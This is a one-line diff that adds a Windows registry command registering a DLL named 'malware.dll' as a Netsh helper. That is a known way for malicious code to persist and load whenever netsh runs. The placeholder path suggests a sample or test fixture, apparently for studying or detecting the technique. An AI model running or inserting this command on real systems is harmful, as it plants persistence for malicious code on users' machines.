@@ -1,0 +1,1 @@
+reg add "HKLM\SOFTWARE\Microsoft\Netsh" /v "malware" /d "D:\abcd\malware.dll"
